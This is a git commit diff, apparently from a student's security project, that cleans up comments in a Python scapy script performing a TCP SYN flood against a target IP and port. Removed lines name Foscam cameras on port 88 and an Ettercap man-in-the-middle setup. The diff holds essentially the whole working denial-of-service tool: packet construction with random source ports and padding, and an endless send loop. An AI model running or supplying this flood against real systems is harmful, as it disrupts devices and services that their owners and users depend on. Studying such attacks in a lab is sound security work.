34f80b1c91177c7b65a8c03904be84783b06e230
MeherShroff2 <m.r.shroff@student.tue.nl>
2025-06-24 12:42:07 +0200

    cleaned DoS code

--- DoS SYN flood/simple_syn_flood.py
+++ DoS SYN flood/simple_syn_flood.py
@@ -4,58 +4,55 @@ import scapy.all as scapy
 import sys
 import os
 
-# --- Utility Functions ---
+"""
+    This script performs a SYN flood attack on a target IP address and port.
+    The precondition is that the attacker has already established a Man-in-the-Middle position
+    
+    Arguments:
+        target_ip : The IP address of the target to flood.
+        target_port: The port to flood.
+    """
 
 def syn_flood(target_ip, target_port):
-    """
-    Performs a TCP SYN flood attack on the target.
-    This function assumes you have already established a
-    Man-in-the-Middle position using a tool like Ettercap.
     
-    Args:
-        target_ip (str): The IP address of the target to flood.
-        target_port (int): The port to flood (e.g., 88 for Foscam web server).
-    """
-    print(f"[*] Starting SYN flood on {target_ip}:{target_port}. Press Ctrl+C to stop.")
+    print(f"[*] Starting SYN flood on {target_ip}:{target_port}.")
     
     # Construct the malicious packet
     ip_layer = scapy.IP(dst=target_ip)
-    # "S" flag indicates a SYN packet. RandShort() provides a random source port.
+    # RandShort() provides a random source port.
     tcp_layer = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
-    # Add some raw data to increase packet size
+    # Adding raw data to increase the packet size
     raw_layer = scapy.Raw(b"X"*1024)
     
     packet = ip_layer / tcp_layer / raw_layer
     
     packets_sent = 0
     try:
-        # Loop indefinitely, sending packets as fast as possible
+        # Sending packets as fast as possible until script is interrupted
         while True:
             scapy.send(packet, verbose=False)
             packets_sent += 1
             print(f"\r[+] Packets sent: {packets_sent}", end="")
 
     except KeyboardInterrupt:
-        print("\n[*] SYN flood stopped by user.")
+        print("\n[*] SYN flood stopped.")
         return
-
-# --- Main Execution ---
 
 if __name__ == "__main__":
     # This script requires root privileges to send raw packets
     if os.geteuid() != 0:
-        print("[-] This script must be run as root. Please use 'sudo'.")
+        print("[-] Root privileges missing.")
         sys.exit(1)
 
     try:
         # Get target information from the user
-        target_ip = input("[*] Enter Target IP (Camera): ")
-        target_port = int(input("[*] Enter Target Port (e.g., 88 for Foscam web server): "))
+        target_ip = input("[*] Enter Target IP: ")
+        target_port = int(input("[*] Enter Target Port: "))
     except ValueError:
-        print("\n[-] Invalid port number. It must be an integer. Exiting.")
+        print("\n[-] Invalid port number.")
         sys.exit(1)
     except KeyboardInterrupt:
-        print("\n[-] User requested exit. Goodbye.")
+        print("\n[-] Exit.")
         sys.exit(0)
 
     # Launch the SYN flood
